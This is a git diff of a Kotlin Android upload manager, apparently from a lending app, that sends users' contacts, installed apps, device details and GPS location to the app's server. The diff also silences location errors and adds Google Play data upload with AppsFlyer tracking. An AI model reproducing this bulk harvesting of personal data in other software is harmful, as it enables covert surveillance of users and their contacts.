@@ -2,18 +2,28 @@ package com.mari.uang.util.upload
 
 import android.Manifest
 import android.location.Location
+import android.util.Log
 import com.alibaba.fastjson.JSONArray
 import com.alibaba.fastjson.JSONObject
 import com.coupang.common.network.ParameterTool
 import com.coupang.common.user.UserManager
-import com.coupang.common.utils.ToastKt
+import com.coupang.common.utils.spf.SpConfig
 import com.mari.uang.AppApi
 import com.mari.uang.MyApplication
 import com.mari.uang.config.ConstantConfig.TYPE_APP
 import com.mari.uang.config.ConstantConfig.TYPE_CONTACT
+import com.mari.uang.event.LocationCall
+import com.mari.uang.event.LocationTool
+import com.mari.uang.util.EventUtil
 import com.mari.uang.util.JsonUtil
 import com.mari.uang.util.PermissionUtil
 import com.mari.uang.util.upload.app.RXGetAppInfo
+import io.reactivex.android.schedulers.AndroidSchedulers
+import io.reactivex.functions.Consumer
+import io.reactivex.schedulers.Schedulers
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -54,7 +64,9 @@ object UploadManager{
         RXGetAppInfo.getAppInfoList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<ArrayList<AppInfoBean>>{
             override fun infoCallBack(dataObject: ArrayList<AppInfoBean>) {
                 val uploadData = dataObject as ArrayList<AppInfoBean>
-                AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(uploadData)),0, TYPE_APP)
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(uploadData)),0, TYPE_APP)
+                }
             }
         })
     }
@@ -74,7 +86,9 @@ object UploadManager{
         }
         RXGetAppInfo.getContactsList(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONArray>{
             override fun infoCallBack(dataObject: JSONArray) {
-                AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(dataObject)),0, TYPE_CONTACT)
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.upLoadContents(DataAESUtil.encrypt(JsonUtil.toJsonString(dataObject)),0, TYPE_CONTACT)
+                }
             }
         })
     }
@@ -85,7 +99,9 @@ object UploadManager{
     fun uploadLunDuInfo(){
         RXGetAppInfo.getLunDuInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
             override fun infoCallBack(dataObject: JSONObject) {
-                AppApi.api.uploadLunDuInfo(dataObject)
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.uploadLunDuInfo(dataObject)
+                }
             }
         })
     }
@@ -96,7 +112,9 @@ object UploadManager{
     fun uploadDevicesDetail(){
         RXGetAppInfo.getMyDevicesDetail(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<DeviceInfoBean>{
             override fun infoCallBack(dataObject: DeviceInfoBean) {
-                AppApi.api.uploadDevicesDetail(ParameterTool.toRequestBody(JsonUtil.toJsonString(dataObject)))
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.uploadDevicesDetail(ParameterTool.toRequestBody(JsonUtil.toJsonString(dataObject)))
+                }
             }
         })
     }
@@ -105,9 +123,11 @@ object UploadManager{
      * 上传设备信息
      */
     fun uploadDevicesReport(){
-        RXGetAppInfo.uploadDevicesReport(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
+        RXGetAppInfo.getDevicesReportInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<JSONObject>{
             override fun infoCallBack(dataObject: JSONObject) {
-                AppApi.api.uploadDevicesReport(ParameterTool.toRequestBody(dataObject))
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.uploadDevicesReport(ParameterTool.toRequestBody(dataObject))
+                }
             }
         })
     }
@@ -116,10 +136,11 @@ object UploadManager{
      * 上传定位信息
      */
     fun upLoadLocation(){
-        LocationUtil.startLocation(object : LocationUtil.LocCallBack{
+        LocationTool.getInstance().startLocation(object :
+            LocationCall {
             override fun error(errorMsg: String?) {
-                ToastKt.short(errorMsg!!)
             }
+
             override fun location(
                 location: Location?,
                 addressDetail: String?,
@@ -135,7 +156,30 @@ object UploadManager{
                 map["address"] = addressDetail!!
                 map["addressInfo"] = addressJson!!
                 map["time"] = format.format(date)
-                AppApi.api.uploadLocation(ParameterTool.toRequestBody(map))
+                CoroutineScope(Dispatchers.Main).launch {
+                    AppApi.api.uploadLocation(ParameterTool.toRequestBody(map))
+                }
+            }
+
+        })
+    }
+
+    fun uploadGoogleMarket(){
+        if (SpConfig.nfur)
+            return
+        RXGetAppInfo.getGoogleMarketInfo(MyApplication.baseCox()!!,object : RXGetAppInfo.InfoDataCallBack<Map<String,Any>>{
+            override fun infoCallBack(dataObject: Map<String, Any>) {
+                AppApi.api.upLoadGoogleMarket(ParameterTool.toRequestBody(dataObject)).subscribeOn(
+                    Schedulers.io())
+                    .unsubscribeOn(Schedulers.io())
+                    .observeOn(AndroidSchedulers.mainThread())
+                    .subscribe(Consumer {
+                        SpConfig.nfur = true
+                        if (it.data != null && "1" == it.data?.getString("initEvent")) {
+                            Log.e("谷歌信息", "上传成功，初始化AF")
+                            EventUtil.initAF()
+                        }
+                    })
             }
         })
     }
